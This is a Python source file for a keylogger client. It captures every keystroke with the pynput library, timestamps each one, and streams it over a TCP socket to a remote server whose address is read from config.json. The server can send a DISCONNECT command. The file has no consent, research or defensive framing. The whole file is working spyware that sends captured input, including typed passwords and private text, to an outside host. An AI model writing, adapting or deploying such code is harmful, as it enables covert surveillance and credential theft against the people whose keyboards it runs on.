import pynput
import socket
import threading
import datetime
import json


# Read configuration from file
with open('./config.json', 'r') as config_file:
    config=json.load(config_file)

SERVER_IP = config['SERVER']['IP']
SERVER_PORT = config['SERVER']['PORT']

# Persistent connection to the server
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Function to connect to the server and handle errors
def connect_to_server():
    try:
        client_socket.connect((SERVER_IP, SERVER_PORT))
        print(f"Connected to server at {SERVER_IP}:{SERVER_PORT}")
    except Exception as e:
        print(f"Error connecting to server: {e}")
        exit(1)

# Function to send data to the server
def send_data(data):
    try:
        client_socket.sendall(data.encode('utf-8'))
    except Exception as e:
        print(f"Error sending data: {e}")
        client_socket.close()
        exit(1)

# Function to record key logs and send them to the server
def on_press(key):
    try:
        # Get the current day and time
        current_time = datetime.datetime.now().strftime("%A %Y-%m-%d %H:%M:%S")
        # Check if the key has a 'char' attribute (standard key)
        if hasattr(key, 'char') and key.char:
            log = f"Key pressed: {key.char}"
        else:
            log = f"Special key pressed: {key}"
        # Print the day, time, and key log
        log = f"[{current_time}] {log}"  
        send_data(log)
    except Exception as e:
        print(f"Error handling keypress: {e}")

# Function to listen for server messages
def listen_to_server():
    try:
        while True:
            response = client_socket.recv(1024).decode('utf-8')
            if response == "DISCONNECT":
                print("[Server instructed client to disconnect]")
                break
    except Exception as e:
        print(f"Error receiving data: {e}")
    finally:
        client_socket.close()

# Function to keep the client running, listening to both keyboard and server
def main():
    # Connect to the server
    connect_to_server()

    # Start a thread for listening to server messages
    server_listener_thread = threading.Thread(target=listen_to_server)
    server_listener_thread.daemon = True  # Ensure this thread exits with the program
    server_listener_thread.start()

    # Start listening to the keyboard
    listener = pynput.keyboard.Listener(on_press=on_press)
    listener.start()
    print("[Keystroke listener started]")

    # Wait for the keyboard listener to finish
    listener.join()  # This will block until the listener thread is done

if __name__ == "__main__":
    main()
